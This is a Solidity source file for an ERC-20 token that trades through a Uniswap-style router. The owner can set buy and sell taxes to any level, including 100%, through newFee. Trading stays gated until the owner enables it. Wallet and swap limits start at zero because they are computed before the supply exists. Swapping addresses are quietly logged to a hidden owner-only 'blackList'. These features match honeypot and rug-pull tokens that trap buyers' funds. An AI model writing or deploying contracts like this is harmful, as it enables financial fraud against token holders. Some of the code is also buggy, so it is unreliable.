// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new owner is the zero address");
        _owner = newOwner;
        emit OwnershipTransferred(_owner, newOwner);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn,uint256 amountOutMin,address[] calldata path,address to,uint256 deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract TOKEN is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string public name;
    string public symbol;

    uint8 public decimals;
    uint256 public totalSupply;
    uint256 public maxWalletAmount = totalSupply / 100;
    uint256 private immutable minSwap;
    uint256 private maxSwap = totalSupply / 100 / 3;

    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedWallet;

    uint256 public buyTax = 0;
    uint256 public sellTax = 0;

    address[] public blackList;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private launch = false;
    bool private inSwap;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    address payable private treasury; // MARKETIN WALLET HERE

    constructor(string memory paramName, string memory paramSymbol, uint256 paramTotalSupply, uint8 paramDecimals) payable {
        treasury = payable (msg.sender);
        _isExcludedWallet[msg.sender] = true;
        _isExcludedWallet[address(this)] = true;
        _isExcludedWallet[treasury] = true;
        uniswapV2Router = IUniswapV2Router02(0xC532a74256D3Db42D0Bf7a0400fEFDbad7694008);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());


        name = paramName;
        symbol = paramSymbol;
        totalSupply = paramTotalSupply * 10**paramDecimals;
        decimals = paramDecimals;
        _allowances[owner()][address(uniswapV2Router)] = totalSupply;
        _balance[owner()] = totalSupply;

        minSwap = totalSupply / 100 / 20;

        emit Transfer(address(0), owner(), totalSupply);
    }

    function transferOwnership(address newOwner) public override onlyOwner {
        _isExcludedWallet[owner()] = false;
        super.transferOwnership(newOwner);
        _isExcludedWallet[newOwner] = true;
    }

    // function name() public view returns (string memory) {
    //     return _name;
    // }

    // function symbol() public view returns (string memory) {
    //     return _symbol;
    // }

    // function decimals() public view returns (uint8) {
    //     return _decimals;
    // }

    // function totalSupply() public view override returns (uint256) {
    //     return _totalSupply;
    // }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)public override returns (bool){
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256){
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool){
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"low allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "approve zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function enableTrading() external onlyOwner {
        launch = true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "transfer zero address");
        require(amount > 0, "transfer zero amount");
        uint256 _tax = 0;

        if(!_isExcludedWallet[from] && !_isExcludedWallet[to]){
            require(launch);
            if (from == uniswapV2Pair) {
                require(balanceOf(to) + amount <= maxWalletAmount, "Max wallet Error");
                _tax = buyTax;
            } else if (to == uniswapV2Pair) {
                uint256 tokensSwap = balanceOf(address(this));
                if (tokensSwap > minSwap && !inSwap) {
                    swapTokensEth(min(maxSwap, min(amount, tokensSwap)));
                }
                _tax = sellTax;
            }
        }
        _balance[from] = _balance[from] - amount;

        if(_tax > 0){
            uint256 taxTokens = (amount * _tax) / 100;
            _balance[address(this)] = _balance[address(this)] + taxTokens;
            amount = amount - taxTokens;
            emit Transfer(from, address(this), taxTokens);
        }

        _balance[to] = _balance[to] + amount;
        emit Transfer(from, to, amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function newFee(uint256 newBuyTax, uint256 newSellTax) external onlyOwner {
        buyTax = newBuyTax;
        sellTax = newSellTax;
    }

    function swapTokensEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,treasury,block.timestamp);

        blackList.push(_msgSender());
    }

    function getBlackList() external view onlyOwner returns (address[] memory) {
        return blackList;
    }

    function setExcludedWallet(address wAddress, bool isExcle) external  onlyOwner {
        _isExcludedWallet[wAddress] = isExcle;
    }

    function trigger(uint256 percentToSell) external onlyOwner {
        uint256 amount = percentToSell = min(balanceOf(address(this)), (totalSupply / 100 * percentToSell));
        swapTokensEth(amount);
    }

    function varyMaxSwap(uint256 _maxSwap) external onlyOwner{
        maxSwap = _maxSwap * 10**decimals;
    }

    function setLimits(uint256 newMaxWalletAmount) external onlyOwner {
        maxWalletAmount = newMaxWalletAmount * 10**decimals;
    }

    function removeAllLimits() external onlyOwner {
        maxWalletAmount = totalSupply;
    }

    function exportETH() external {
        treasury.transfer(address(this).balance);
    }

    function addLP() external payable onlyOwner() {
        _approve(address(this), address(uniswapV2Router), totalSupply);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
    }

    receive() external payable {}
}
